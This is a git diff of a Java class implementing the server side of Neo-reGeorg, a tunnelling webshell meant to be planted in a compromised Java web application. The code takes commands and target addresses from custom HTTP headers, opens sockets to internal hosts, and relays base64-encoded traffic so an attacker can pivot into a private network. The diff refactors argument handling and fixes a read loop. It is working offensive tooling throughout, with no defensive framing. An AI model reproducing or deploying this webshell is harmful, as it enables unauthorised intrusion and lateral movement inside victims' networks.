@@ -14,33 +14,50 @@ import java.util.Enumeration;
 import java.util.List;
 
 /**
- * @Modifier c0ny1
- * @Date 2021-08-17 15:00
+ * @Modifier c0ny1, L
+ * @CreateDate 2021-08-17
  * @Description 将Neo-reGeorg jsp服务端改为java代码，提高兼容性
  */
+
 public class NeoreGeorg {
     private char[] en;
-    private  byte[] de;
-    private int HTTPCODE;
-    private int READBUF;
-    private int MAXREADSIZE;
+    private byte[] de;
 
     @Override
     public boolean equals(Object obj) {
         try {
-            Object[] args = (Object[]) obj;
-            HttpServletRequest request = (HttpServletRequest) args[0];
+            Object[] args                = (Object[]) obj;
+            HttpServletRequest request   = (HttpServletRequest) args[0];
             HttpServletResponse response = (HttpServletResponse) args[1];
-            en = (char[])args[2];
-            de = (byte[])args[3];
-            HTTPCODE = (Integer) args[4];
-            READBUF = (Integer) args[5];
-            MAXREADSIZE = (Integer) args[6];
+            en                           = (char[]) args[2];
+            de                           = (byte[]) args[3];
+            int HTTPCODE                 = (Integer) args[4];
+            int READBUF                  = (Integer) args[5];
+            int MAXREADSIZE              = (Integer) args[6];
+            String XSTATUS               = (String) args[7];
+            String XERROR                = (String) args[8];
+            String XCMD                  = (String) args[9];
+            String XTARGET               = (String) args[10];
+            String XREDIRECTURL          = (String) args[11];
+            String FAIL                  = (String) args[12];
+            String GeorgHello            = (String) args[13];
+            String FailedCreatingSocket  = (String) args[14];
+            String FailedConnecting      = (String) args[15];
+            String OK                    = (String) args[16];
+            String FailedWriting         = (String) args[17];
+            String CONNECT               = (String) args[18];
+            String DISCONNECT            = (String) args[19];
+            String READ                  = (String) args[20];
+            String FORWARD               = (String) args[21];
+            String FailedReading         = (String) args[22];
+            String CloseNow              = (String) args[23];
+            String ReadFiled             = (String) args[24];
+            String ForwardingFailed      = (String) args[25];
 
             ServletContext application = request.getSession().getServletContext();
             Writer out = response.getWriter();
 
-            String rUrl = request.getHeader(o2s(args[11]));// X-REDIRECTURL
+            String rUrl = request.getHeader(XREDIRECTURL);
             if (rUrl != null) {
                 rUrl = new String(b64de(rUrl));
                 if (!islocal(rUrl)){
@@ -71,8 +88,7 @@ public class NeoreGeorg {
                         try{
                             output = conn.getOutputStream();
                         }catch(Exception e){
-                            // X-ERROR: Intranet forwarding failed
-                            response.setHeader(o2s(args[8]), o2s(args[25]));
+                            response.setHeader(XERROR, ForwardingFailed);
                             return false;
                         }
 
@@ -120,33 +136,33 @@ public class NeoreGeorg {
 
             response.resetBuffer();
             response.setStatus(HTTPCODE);
-            String cmd = request.getHeader(o2s(args[9]));//X-CMD
+            String cmd = request.getHeader(XCMD);
             if (cmd != null) {
                 String mark = cmd.substring(0,22);
                 cmd = cmd.substring(22);
-                response.setHeader(o2s(args[7]), o2s(args[16])); // X-STATUS: OK
-                if (cmd.compareTo(o2s(args[18])) == 0) { // CONNECT
+                response.setHeader(XSTATUS, OK);
+                if (cmd.compareTo(CONNECT) == 0) {
                     try {
-                        String[] target_ary = new String(b64de(request.getHeader(o2s(args[10])))).split("\\|"); // X-TARGET
+                        String[] target_ary = new String(b64de(request.getHeader(XTARGET))).split("\\|");
                         String target = target_ary[0];
                         int port = Integer.parseInt(target_ary[1]);
                         SocketChannel socketChannel = SocketChannel.open();
                         socketChannel.connect(new InetSocketAddress(target, port));
                         socketChannel.configureBlocking(false);
                         application.setAttribute(mark, socketChannel);
-                        response.setHeader(o2s(args[7]), o2s(args[16])); // X-STATUS: OK
+                        response.setHeader(XSTATUS, OK);
                     } catch (Exception e) {
-                        response.setHeader(o2s(args[8]), o2s(args[15])); // X-ERROR: Failed connecting to target
-                        response.setHeader(o2s(args[7]), o2s(args[12])); // X-STATUS: FAIL
+                        response.setHeader(XERROR, FailedConnecting);
+                        response.setHeader(XSTATUS, FAIL);
                     }
-                } else if (cmd.compareTo(o2s(args[19])) == 0) { // DISCONNECT
+                } else if (cmd.compareTo(DISCONNECT) == 0) {
                     SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                     try{
                         socketChannel.socket().close();
                     } catch (Exception e) {
                     }
                     application.removeAttribute(mark);
-                } else if (cmd.compareTo(o2s(args[20])) == 0){ // READ
+                } else if (cmd.compareTo(READ) == 0){
                     SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                     try{
                         ByteBuffer buf = ByteBuffer.allocate(READBUF);
@@ -164,23 +180,24 @@ public class NeoreGeorg {
                                 break;
                             bytesRead = socketChannel.read(buf);
                         }
-                        response.setHeader(o2s(args[7]), o2s(args[16])); // X-STATUS: OK
+                        response.setHeader(XSTATUS, OK);
 
                     } catch (Exception e) {
-                        response.setHeader(o2s(args[7]), o2s(args[12])); // X-STATUS: FAIL
+                        response.setHeader(XSTATUS, FAIL);
                     }
 
-                } else if (cmd.compareTo(o2s(args[21])) == 0){ // FORWARD
+                } else if (cmd.compareTo(FORWARD) == 0){
                     SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                     try {
                         String inputData = "";
                         InputStream in = request.getInputStream();
                         while ( true ){
                             int buffLen = in.available();
-                            if (buffLen == -1)
-                                break;
+                            // if (buffLen == -1)
+                            //     break;
                             byte[] buff = new byte[buffLen];
-                            in.read(buff);
+                            if (in.read(buff) == -1)
+                                break;
                             inputData += new String(buff);
                         }
                         byte[] base64 = b64de(inputData);
@@ -191,25 +208,21 @@ public class NeoreGeorg {
                         while(buf.hasRemaining())
                             socketChannel.write(buf);
 
-                        response.setHeader(o2s(args[7]), o2s(args[16])); // X-STATUS: OK
+                        response.setHeader(XSTATUS, OK);
 
                     } catch (Exception e) {
-                        response.setHeader(o2s(args[8]), o2s(args[24])); // X-ERROR: POST request read filed
-                        response.setHeader(o2s(args[7]), o2s(args[12])); // X-STATUS: FAIL
+                        response.setHeader(XERROR, ReadFiled);
+                        response.setHeader(XSTATUS, FAIL); // X-STATUS: FAIL
                         socketChannel.socket().close();
                     }
                 }
             } else {
-                out.write(o2s(args[13])); // Georg says, 'All seems fine'
+                out.write(GeorgHello);
             }
         }catch (Exception e){
 
         }
         return false;
-    }
-
-    public String o2s(Object obj){
-        return (String)obj;
     }
 
     public String b64en(byte[] data) {
